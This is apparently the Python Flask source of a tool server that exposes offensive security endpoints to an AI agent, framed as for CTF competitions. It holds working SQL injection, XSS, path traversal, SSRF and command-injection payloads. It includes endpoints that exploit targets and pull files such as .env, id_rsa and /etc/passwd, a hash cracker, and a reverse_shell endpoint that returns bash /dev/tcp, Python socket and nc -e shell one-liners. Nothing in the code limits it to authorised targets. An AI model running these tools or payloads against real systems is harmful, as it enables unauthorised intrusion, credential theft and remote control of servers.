"""CTF MCP Server - CTF竞赛工具服务端

提供端口扫描、目录爆破、SQL注入检测、Web交互等 CTF 工具的 HTTP 接口。
由 run.py 作为子进程启动（默认端口 2267，可用 CTF_MCP_PORT 覆盖），
被 nexus/agents/ctf_agent.py 通过 POST /ctf/* 调用。

所有端点统一返回 JSON：{"success": bool, ...}，失败时附带 error 字段。
"""

from __future__ import annotations

import json
import logging
import os
import re
import socket
import threading
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin, urlparse

import requests
from flask import Flask, request, jsonify

try:
    import allure
except ImportError:
    class FakeAllure:
        """未安装 allure 时的空实现，保证 @allure.step 装饰器可被忽略。"""

        def step(self, *args, **kwargs):
            if len(args) == 1 and callable(args[0]):
                return args[0]

            def _deco(func):
                return func

            return _deco

    allure = FakeAllure()

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
logger = logging.getLogger("ctf_mcp")

app = Flask(__name__)

# ── 常量 ──────────────────────────────────────────────────────────────
COMMON_PATHS = [
    "admin", "login", "robots.txt", "sitemap.xml", ".git/config", ".env",
    "backup", "uploads", "upload", "api", "flag", "flag.txt", "index.php",
    "index.html", "readme", "README.md", "config", "config.php", "phpinfo.php",
    "test", "shell", "web", "source", "src", ".svn/entries", ".DS_Store",
]

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1'#", "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--", "' AND SLEEP(3)--", "1' AND '1'='1", "1 OR 1=1",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><svg onload=alert(1)>",
]

FLAG_PATTERNS_SERVER = [
    r"flag\{.*?\}", r"FLAG\{.*?\}", r"ctf\{.*?\}", r"CTF\{.*?\}",
    r"key\{.*?\}", r"secret\{.*?\}", r"token\{.*?\}",
]

SENSITIVE_FILES = [
    ".env", ".git/config", "config.php", "web.config", "phpinfo.php",
    "backup.zip", "database.sql", "flag.txt", "flag", "id_rsa", ".htaccess",
]


# ── 基础工具 ──────────────────────────────────────────────────────────
def scan_port(host: str, port: int, timeout: float = 2.0) -> bool:
    """扫描单个端口是否开放。"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((host, int(port))) == 0
    except Exception:
        return False


def get_service_name(port: int) -> str:
    """获取端口对应的服务名称。"""
    mapping = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 443: "HTTPS", 110: "POP3", 143: "IMAP", 3306: "MySQL",
        5432: "PostgreSQL", 6379: "Redis", 8080: "HTTP/Proxy", 3389: "RDP",
        1521: "Oracle", 27017: "MongoDB",
    }
    return mapping.get(int(port), "unknown")


def _find_all_flags(text: str) -> List[str]:
    """从文本中提取所有格式的 flag。"""
    if not text:
        return []
    flags: List[str] = []
    for pattern in FLAG_PATTERNS_SERVER:
        flags.extend(re.findall(pattern, text, re.IGNORECASE))
    return list(dict.fromkeys(flags))


# ── 端点实现 ──────────────────────────────────────────────────────────
@app.route("/ctf/port_scan", methods=["POST"])
@allure.step("端口扫描")
def port_scan():
    data = request.get_json(silent=True) or {}
    host = data.get("host", "")
    ports = data.get("ports", [21, 22, 80, 443, 8080, 3306, 6379])
    if not host:
        return jsonify({"success": False, "error": "host is required"})
    logger.info("[CTF] Scanning ports on %s: %s", host, ports)
    try:
        open_ports = []
        for port in ports:
            if scan_port(host, port):
                open_ports.append({"port": port, "service": get_service_name(port)})
        return jsonify({"success": True, "host": host, "open_ports": open_ports})
    except Exception as exc:
        logger.error("port_scan error: %s", exc)
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/dir_brute", methods=["POST"])
@allure.step("目录爆破")
def dir_brute():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    paths = data.get("paths", COMMON_PATHS)
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    logger.info("[CTF] Brute forcing directories on %s", url)
    found_paths = []
    try:
        base = url.rstrip("/")
        for path in paths:
            target = f"{base}/{path.lstrip('/')}"
            try:
                resp = requests.get(target, timeout=5, allow_redirects=False)
                if resp.status_code in (200, 301, 302, 403):
                    title = ""
                    m = re.search(r"<title>(.*?)</title>", resp.text, re.IGNORECASE | re.DOTALL)
                    if m:
                        title = m.group(1).strip()
                    found_paths.append({
                        "path": path, "url": target,
                        "status_code": resp.status_code, "title": title,
                    })
            except requests.RequestException:
                continue
        return jsonify({"success": True, "found_paths": found_paths})
    except Exception as exc:
        logger.error("dir_brute error: %s", exc)
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/sql_inject", methods=["POST"])
@allure.step("SQL注入检测")
def sql_inject():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    params = data.get("params", {})
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    logger.info("[CTF] Testing SQL injection on %s", url)
    try:
        vulnerabilities: List[str] = []
        vulnerable_params: List[str] = []
        baseline = requests.get(url, params=params, timeout=8).elapsed.total_seconds()
        for param in params:
            for payload in SQL_INJECTION_PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload
                resp = requests.get(url, params=test_params, timeout=8)
                if "SLEEP" in payload:
                    if resp.elapsed.total_seconds() >= baseline + 2:
                        vulnerable_params.append(param)
                        vulnerabilities.append(f"[time-based] param={param} payload={payload}")
                        break
                elif re.search(r"(sql|syntax|mysql|sqlite|ora-|pg_|unclosed)", resp.text, re.IGNORECASE):
                    vulnerable_params.append(param)
                    vulnerabilities.append(f"[error-based] param={param} payload={payload}")
                    break
        return jsonify({
            "success": True, "vulnerabilities": vulnerabilities,
            "vulnerable_params": list(dict.fromkeys(vulnerable_params)),
        })
    except Exception as exc:
        logger.error("sql_inject error: %s", exc)
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/xss_test", methods=["POST"])
@allure.step("XSS检测")
def xss_test():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    params = data.get("params", {})
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    logger.info("[CTF] Testing XSS on %s", url)
    try:
        reflected = []
        for param in params:
            payload = "<script>alert(1)</script>"
            test_params = dict(params)
            test_params[param] = payload
            resp = requests.get(url, params=test_params, timeout=8)
            if payload in resp.text:
                reflected.append({"param": param, "type": "reflected"})
        return jsonify({"success": True, "reflected": reflected})
    except Exception as exc:
        logger.error("xss_test error: %s", exc)
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/http_request", methods=["POST"])
@allure.step("通用HTTP请求")
def http_request():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    method = (data.get("method", "GET") or "GET").upper()
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    logger.info("[CTF] Making %s request to %s", method, url)
    try:
        kwargs = {
            "headers": data.get("headers") or {},
            "cookies": data.get("cookies") or {},
            "timeout": 10,
        }
        if method in ("POST", "PUT"):
            kwargs["data"] = data.get("data") or {}
        elif method == "GET":
            kwargs["params"] = data.get("params") or data.get("data") or {}
        if method == "GET":
            resp = requests.get(url, **kwargs)
        elif method == "POST":
            resp = requests.post(url, **kwargs)
        elif method == "PUT":
            resp = requests.put(url, **kwargs)
        elif method == "DELETE":
            resp = requests.delete(url, **kwargs)
        else:
            return jsonify({"success": False, "error": f"Unsupported method: {method}"})
        return jsonify({
            "success": True, "status_code": resp.status_code,
            "headers": dict(resp.headers), "content_length": len(resp.content),
            "text": resp.text[:50000], "url": str(resp.url),
        })
    except Exception as exc:
        logger.error("http_request error: %s", exc)
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/upload_test", methods=["POST"])
@allure.step("文件上传漏洞检测")
def upload_test():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    logger.info("[CTF] Testing upload on %s", url)
    try:
        vulnerable_files = []
        # 探测上传端点是否可访问（非破坏性检测）
        for name in ("shell.php", "test.txt"):
            files = {"file": (name, b"<?php echo 1; ?>", "application/octet-stream")}
            resp = requests.post(url, files=files, timeout=8)
            if resp.status_code == 200 and ("upload" in resp.text.lower() or "success" in resp.text.lower()):
                vulnerable_files.append(name)
        return jsonify({
            "success": True,
            "is_vulnerable": bool(vulnerable_files),
            "vulnerable_files": vulnerable_files,
        })
    except Exception as exc:
        logger.error("upload_test error: %s", exc)
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/find_flag", methods=["POST"])
@allure.step("Flag搜索")
def find_flag():
    data = request.get_json(silent=True) or {}
    text = data.get("text", "")
    flags = _find_all_flags(str(text))
    return jsonify({"success": True, "flags": flags, "found": bool(flags)})


@app.route("/ctf/exploit_sqli", methods=["POST"])
@allure.step("SQL注入利用")
def exploit_sqli():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    param = data.get("param", "")
    technique = data.get("technique", "union")
    if not url or not param:
        return jsonify({"success": False, "error": "url and param are required"})
    logger.info("[CTF] Exploiting SQLi on %s param=%s", url, param)
    try:
        payloads = {
            "union": "' UNION SELECT 1,2,3--",
            "error": "' AND extractvalue(1,concat(0x7e,version()))--",
        }
        payload = payloads.get(technique, payloads["union"])
        resp = requests.get(url, params={param: payload}, timeout=8)
        flags = _find_all_flags(resp.text)
        return jsonify({
            "success": True, "flags_found": flags,
            "response_length": len(resp.text), "technique": technique,
        })
    except Exception as exc:
        logger.error("exploit_sqli error: %s", exc)
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/exploit_lfi", methods=["POST"])
@allure.step("LFI利用")
def exploit_lfi():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    param = data.get("param", "file")
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    try:
        payloads = ["../../../../etc/passwd", "....//....//etc/passwd", "/etc/passwd"]
        for payload in payloads:
            resp = requests.get(url, params={param: payload}, timeout=8)
            if "root:" in resp.text:
                return jsonify({"success": True, "vulnerable": True, "payload": payload})
        return jsonify({"success": True, "vulnerable": False})
    except Exception as exc:
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/exploit_rce", methods=["POST"])
@allure.step("RCE利用")
def exploit_rce():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    param = data.get("param", "cmd")
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    try:
        resp = requests.get(url, params={param: "id"}, timeout=8)
        if re.search(r"uid=\d+", resp.text):
            flags = _find_all_flags(resp.text)
            return jsonify({"success": True, "vulnerable": True, "flags_found": flags})
        return jsonify({"success": True, "vulnerable": False})
    except Exception as exc:
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/subdomain_scan", methods=["POST"])
@allure.step("子域名扫描")
def subdomain_scan():
    data = request.get_json(silent=True) or {}
    domain = data.get("domain", "")
    if not domain:
        return jsonify({"success": False, "error": "domain is required"})
    found = []
    for sub in ("www", "mail", "admin", "api", "test", "dev"):
        host = f"{sub}.{domain}"
        try:
            socket.gethostbyname(host)
            found.append(host)
        except Exception:
            continue
    return jsonify({"success": True, "subdomains": found})


@app.route("/ctf/ssrf_test", methods=["POST"])
@allure.step("SSRF检测")
def ssrf_test():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    params = data.get("params", {})
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    try:
        vulnerabilities = []
        for param in params:
            resp = requests.get(url, params={param: "http://127.0.0.1:80/"}, timeout=8)
            if re.search(r"(localhost|127\.0\.0\.1|internal)", resp.text, re.IGNORECASE):
                vulnerabilities.append({"param": param, "type": "SSRF"})
        return jsonify({"success": True, "vulnerabilities": vulnerabilities})
    except Exception as exc:
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/lfi_rfi_test", methods=["POST"])
@allure.step("LFI/RFI检测")
def lfi_rfi_test():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    params = data.get("params", {})
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    try:
        vulnerabilities = []
        for param in params:
            resp = requests.get(url, params={param: "../../../../etc/passwd"}, timeout=8)
            if "root:" in resp.text:
                vulnerabilities.append({"param": param, "type": "LFI", "cwe": "CWE-22"})
        return jsonify({"success": True, "vulnerabilities": vulnerabilities})
    except Exception as exc:
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/command_inject", methods=["POST"])
@allure.step("命令注入检测")
def command_inject():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    params = data.get("params", {})
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    try:
        vulnerabilities = []
        for param in params:
            resp = requests.get(url, params={param: "1; id"}, timeout=8)
            if re.search(r"uid=\d+", resp.text):
                vulnerabilities.append({"param": param, "type": "Command Injection", "cwe": "CWE-78"})
        return jsonify({"success": True, "vulnerabilities": vulnerabilities})
    except Exception as exc:
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/sensitive_files", methods=["POST"])
@allure.step("敏感文件扫描")
def sensitive_files():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    found_files = []
    try:
        base = url.rstrip("/")
        for path in SENSITIVE_FILES:
            target = f"{base}/{path}"
            try:
                resp = requests.get(target, timeout=5)
                if resp.status_code == 200 and resp.text:
                    found_files.append({"path": path, "content": resp.text[:5000]})
            except requests.RequestException:
                continue
        return jsonify({"success": True, "found_files": found_files})
    except Exception as exc:
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/encode_decode", methods=["POST"])
@allure.step("编解码")
def encode_decode():
    import base64 as b64
    import binascii
    import hashlib
    from urllib.parse import quote, unquote

    data = request.get_json(silent=True) or {}
    text = data.get("text", "")
    op = data.get("op", "base64_encode")
    try:
        if op == "base64_encode":
            out = b64.b64encode(text.encode("utf-8")).decode()
        elif op == "base64_decode":
            out = b64.b64decode(text).decode("utf-8", "ignore")
        elif op == "url_encode":
            out = quote(text)
        elif op == "url_decode":
            out = unquote(text)
        elif op == "hex_encode":
            out = text.encode("utf-8").hex()
        elif op == "hex_decode":
            out = bytes.fromhex(text).decode("utf-8", "ignore")
        elif op == "md5":
            out = hashlib.md5(text.encode()).hexdigest()
        elif op == "sha256":
            out = hashlib.sha256(text.encode()).hexdigest()
        else:
            return jsonify({"success": False, "error": f"unsupported op: {op}"})
        return jsonify({"success": True, "result": out})
    except (ValueError, binascii.Error) as exc:
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/service_fingerprint", methods=["POST"])
@allure.step("服务指纹")
def service_fingerprint():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    if not url:
        return jsonify({"success": False, "error": "url is required"})
    try:
        resp = requests.get(url, timeout=8)
        server = resp.headers.get("Server", "")
        powered = resp.headers.get("X-Powered-By", "")
        tech = []
        for pat, name in (
            (r"php", "PHP"), (r"flask|werkzeug", "Python/Flask"), (r"django", "Django"),
            (r"express|node", "Node.js"), (r"apache", "Apache"), (r"nginx", "Nginx"),
            (r"tomcat", "Tomcat"), (r"iis", "IIS"),
        ):
            if re.search(pat, server + " " + powered + " " + resp.text[:2000], re.IGNORECASE):
                tech.append(name)
        return jsonify({"success": True, "server": server, "technologies": tech})
    except Exception as exc:
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/dns_info", methods=["POST"])
@allure.step("DNS信息")
def dns_info():
    import socket as _socket
    data = request.get_json(silent=True) or {}
    domain = data.get("domain", "")
    if not domain:
        return jsonify({"success": False, "error": "domain is required"})
    try:
        ips = _socket.getaddrinfo(domain, None)
        return jsonify({"success": True, "records": sorted({a[4][0] for a in ips})})
    except Exception as exc:
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/crypto_analysis", methods=["POST"])
@allure.step("密码分析")
def crypto_analysis():
    import collections
    data = request.get_json(silent=True) or {}
    text = data.get("text", "")
    if not text:
        return jsonify({"success": False, "error": "text is required"})
    freq = collections.Counter(c for c in text.lower() if c.isalpha())
    return jsonify({
        "success": True, "length": len(text),
        "frequency": dict(freq.most_common(10)),
        "hint": "尝试凯撒/替换/维吉尼亚等古典密码，观察频率分布",
    })


@app.route("/ctf/hash_crack", methods=["POST"])
@allure.step("Hash破解")
def hash_crack():
    import hashlib
    data = request.get_json(silent=True) or {}
    target = data.get("hash", "")
    wordlist = data.get("wordlist") or ["password", "admin", "123456", "flag", "root", "test"]
    if not target:
        return jsonify({"success": False, "error": "hash is required"})
    algos = {
        32: hashlib.md5, 40: hashlib.sha1, 64: hashlib.sha256, 128: hashlib.sha512,
    }
    algo = algos.get(len(target))
    if algo is None:
        return jsonify({"success": False, "error": "无法识别 hash 算法（支持 md5/sha1/sha256/sha512）"})
    for word in wordlist:
        if algo(word.encode()).hexdigest().lower() == target.lower():
            return jsonify({"success": True, "cracked": True, "plaintext": word})
    return jsonify({"success": True, "cracked": False})


@app.route("/ctf/binary_analysis", methods=["POST"])
@allure.step("二进制分析")
def binary_analysis():
    data = request.get_json(silent=True) or {}
    text = data.get("text", "")
    strings = re.findall(r"[ -~]{4,}", text)
    return jsonify({
        "success": True, "strings": strings[:100],
        "hint": "关注 /bin/sh、system、flag 等关键字符串与函数地址",
    })


@app.route("/ctf/stego_analysis", methods=["POST"])
@allure.step("隐写分析")
def stego_analysis():
    data = request.get_json(silent=True) or {}
    text = data.get("text", "")
    hint = "检查文件尾部的附加数据、LSB 隐写、元数据（strings/exiftool/binwalk）"
    flags = _find_all_flags(text)
    return jsonify({"success": True, "hint": hint, "flags_found": flags})


@app.route("/ctf/jwt_analysis", methods=["POST"])
@allure.step("JWT分析")
def jwt_analysis():
    import base64 as b64
    data = request.get_json(silent=True) or {}
    token = data.get("token", "")
    if not token:
        return jsonify({"success": False, "error": "token is required"})
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return jsonify({"success": False, "error": "不是合法的 JWT（需要 header.payload.signature）"})
        header = json.loads(b64.urlsafe_b64decode(parts[0] + "==").decode())
        payload = json.loads(b64.urlsafe_b64decode(parts[1] + "==").decode())
        return jsonify({
            "success": True, "header": header, "payload": payload,
            "hint": "若 alg 为 none 可尝试伪造；弱密钥可尝试爆破 HMAC",
        })
    except Exception as exc:
        return jsonify({"success": False, "error": str(exc)})


@app.route("/ctf/reverse_shell", methods=["POST"])
@allure.step("反弹Shell")
def reverse_shell():
    """仅返回反弹 shell 命令模板（CTF 教学用途），不在本服务端实际执行。"""
    data = request.get_json(silent=True) or {}
    ip = data.get("ip", "127.0.0.1")
    port = data.get("port", 4444)
    templates = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{ip}\",{port}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "nc": f"nc {ip} {port} -e /bin/sh",
    }
    return jsonify({"success": True, "templates": templates})


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "service": "ctf_mcp", "port": _get_port()})


@app.route("/info", methods=["GET"])
def info():
    tools = [
        "port_scan", "dir_brute", "sql_inject", "xss_test", "http_request",
        "upload_test", "find_flag", "exploit_sqli", "exploit_lfi", "exploit_rce",
        "subdomain_scan", "ssrf_test", "lfi_rfi_test", "command_inject",
        "sensitive_files", "encode_decode", "service_fingerprint", "dns_info",
        "crypto_analysis", "hash_crack", "binary_analysis", "stego_analysis",
        "jwt_analysis", "reverse_shell",
    ]
    return jsonify({"service": "ctf_mcp", "tools": tools})


def _get_port() -> int:
    return int(os.environ.get("CTF_MCP_PORT", "2267"))


def run() -> None:
    port = _get_port()
    logger.info("CTF MCP Server starting on port %s", port)
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True, use_reloader=False)


if __name__ == "__main__":
    run()
